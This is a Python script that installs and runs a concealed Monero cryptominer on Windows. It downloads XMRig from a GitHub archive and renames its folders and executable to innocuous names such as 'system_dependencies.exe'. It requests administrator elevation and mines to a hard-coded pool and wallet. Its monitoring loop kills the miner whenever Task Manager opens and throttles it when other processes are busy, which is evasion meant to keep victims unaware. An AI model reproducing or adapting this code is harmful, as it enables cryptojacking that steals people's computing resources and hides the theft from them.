import os
import sys
import subprocess
import zipfile
import json
import ctypes
import multiprocessing
import time
import shutil


# Function to install required modules
def install_packages():
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "psutil"])


# Ensure required packages are installed before importing
try:
    import requests
    import psutil
except ImportError:
    print("Required modules not found. Installing...")
    install_packages()
    import requests
    import psutil

# Path to the control file
CONTROL_FILE = os.path.join(os.getenv('TEMP'), 'miner_control.txt')
FIRST_RUN_FILE = os.path.join(os.getenv('APPDATA'), 'frst_run.txt')


# Function to check if script is run as admin
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() == 1
    except:
        return False


# Function to download the zip file
def download_zip(url, dest):
    if not os.path.exists(dest):
        print(f"Downloading {url}...")
        r = requests.get(url)
        with open(dest, 'wb') as f:
            f.write(r.content)
        print("Download completed.")


# Function to extract the zip file and rename folders
def extract_and_rename_zip(zip_path, extract_to):
    if not os.path.exists(extract_to):
        print(f"Extracting {zip_path}...")
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_to)
        print("Extraction completed.")
        
        # Rename directories within the extracted path
        for root, dirs, files in os.walk(extract_to):
            for dir_name in dirs:
                new_dir_name = dir_name.replace("xmrig", "attribute").replace("xmrig", "library").replace("xmrig", "control")
                os.rename(os.path.join(root, dir_name), os.path.join(root, new_dir_name))
        
        # Rename extracted root folder if it contains "xmrig"
        if "xmrig" in extract_to:
            new_extract_to = extract_to.replace("xmrig", "attribute").replace("xmrig", "library").replace("xmrig", "control")
            os.rename(extract_to, new_extract_to)
            extract_to = new_extract_to

        # Delete the zip file after extraction
        os.remove(zip_path)
    
    return extract_to


# Function to create or update the batch files
def create_or_update_batch_files(directory, num_cores):
    rtm_path = os.path.join(directory, "RTM.bat")
    rtm2_path = os.path.join(directory, "RTM2.bat")
    wrapper_script_path = os.path.join(directory, "start_sysdep.bat")

    # Calculate the number of threads for high and low CPU usage
    high_threads = max(1, int(0.9 * num_cores))
    low_threads = max(1, int(0.1 * num_cores))

    rtm_content = f"""call {wrapper_script_path} {high_threads}"""
    rtm2_content = f"""call {wrapper_script_path} {low_threads}"""

    with open(rtm_path, 'w') as f:
        f.write(rtm_content)
    with open(rtm2_path, 'w') as f:
        f.write(rtm2_content)

    print("Batch files created/updated.")


# Function to create the wrapper batch script
def create_wrapper_script(directory):
    wrapper_script_path = os.path.join(directory, "start_sysdep.bat")
    xmrig_path = os.path.join(directory, "xmrig.exe")
    system_dependencies_path = os.path.join(directory, "system_dependencies.exe")

    # Manually copy the icon using Resource Hacker or similar tool
    if not os.path.exists(system_dependencies_path):
        shutil.copy(xmrig_path, system_dependencies_path)

    wrapper_content = f"""
@echo off
"{system_dependencies_path}" --url pool.hashvault.pro:80 --user 47q7x4i3SKAMhULSnPUgRNfQgDpMN6h8KJzvuWQfZ5z3fLkjyXukaQxhWPBnWmRo5ZJEwem4pLw7rhNeZ3Je1EArBT3g5CE --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads=%1
"""
    with open(wrapper_script_path, 'w') as f:
        f.write(wrapper_content)

    print("Wrapper script created/updated.")


# Function to stop xmrig if running
def stop_xmrig():
    try:
        print("Stopping existing xmrig processes...")
        for proc in psutil.process_iter(['pid', 'name', 'ppid']):
            if proc.info['name'] == 'system_dependencies.exe':
                proc.terminate()
                proc.wait(timeout=5)
                print(f"Terminated system_dependencies process: PID {proc.info['pid']}")
    except Exception as e:
        print(f"Error stopping xmrig: {e}")


# Function to open batch files
def open_batch_file(batch_path):
    if os.path.exists(batch_path):
        print(f"Opening {batch_path}...")
        subprocess.Popen(batch_path, shell=True)
        print("Batch file opened.")
    else:
        print(f"Error: The file {batch_path} does not exist.")


# Function to detect high-workload processes
def detect_high_workload_processes():
    high_workload_processes = []
    for proc in psutil.process_iter(['name', 'cpu_percent']):
        if proc.info['name'].lower() != 'system_dependencies.exe' and proc.info['name'] != 'System Idle Process' and \
                proc.info['cpu_percent'] > 50:
            high_workload_processes.append(proc.info['name'])
            print(proc.info['name'])
    return high_workload_processes


# Function to monitor Task Manager and high-workload processes
def monitor_task_manager_and_processes(directory):
    rtm_path = os.path.join(directory, "RTM.bat")
    rtm2_path = os.path.join(directory, "RTM2.bat")
    high_workload_processes = []
    xmrig_running = None

    while os.path.exists(CONTROL_FILE):
        task_manager_detected = any(proc.name() == "Taskmgr.exe" for proc in psutil.process_iter())

        if task_manager_detected:
            if xmrig_running == "high":
                print("Task Manager detected. Stopping high CPU usage xmrig.")
                stop_xmrig()
                xmrig_running = None
            elif xmrig_running == "low":
                print("Task Manager detected. Stopping low CPU usage xmrig.")
                stop_xmrig()
                xmrig_running = None
        elif xmrig_running is None:
            high_workload_processes = detect_high_workload_processes()
            if not high_workload_processes:
                print("No high workload processes detected. Starting xmrig with high CPU usage.")
                open_batch_file(rtm_path)
                xmrig_running = "high"
            else:
                print("High workload process detected. Starting xmrig with low CPU usage.")
                open_batch_file(rtm2_path)
                xmrig_running = "low"

        time.sleep(5)

    print("Control file deleted. Stopping xmrig.")
    stop_xmrig()


def main():
    global CONTROL_FILE

    script_dir = os.path.dirname(os.path.realpath(__file__))
    CONTROL_FILE = os.path.join(script_dir, 'configuration_64x.txt')

    if not os.path.exists(CONTROL_FILE):
        with open(CONTROL_FILE, 'w') as f:
            f.write('Control file for miner script')
            print("Control file created.")

    print("Starting the script...")

    # Create the control file
    with open(CONTROL_FILE, 'w') as f:
        f.write('Control file for miner script')

    # Check if it's the first run
    if not os.path.exists(FIRST_RUN_FILE):
        # First run, need to run as admin
        if not is_admin():
            print("Script needs to be run as administrator.")
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
            return

        # Create the first run file
        with open(FIRST_RUN_FILE, 'w') as f:
            f.write('This file indicates that the miner script has been run before.')

    print("Admin check passed.")

    # URL and paths
    zip_url = "https://github.com/000zz/xmrig-6.21.3-msvc-win64/archive/refs/heads/main.zip"
    zip_path = "xmrig-6.21.3-msvc-win64-main.zip"
    extract_path = "xmrig-6.21.3"
    inner_path = os.path.join(extract_path, "xmrig-6.21.3-msvc-win64")

    # Get the number of CPU cores
    num_cores = multiprocessing.cpu_count()

    # Process
    print("Starting process...")
    download_zip(zip_url, zip_path)
    extract_path = extract_and_rename_zip(zip_path, extract_path)
    inner_path = os.path.join(extract_path, "attribute-6.21.3-msvc-win64-main")  # Adjust inner_path after renaming
    stop_xmrig()  # Stop any running xmrig process

    # Create or update the batch files and wrapper script
    create_or_update_batch_files(inner_path, num_cores)
    create_wrapper_script(inner_path)

    # Start xmrig with high usage
    open_batch_file(os.path.join(inner_path, "RTM.bat"))

    # Add a short delay before starting the monitoring loop
    time.sleep(5)

    # Monitor Task Manager and adjust xmrig usage accordingly
    monitor_task_manager_and_processes(inner_path)


if __name__ == "__main__":
    main()
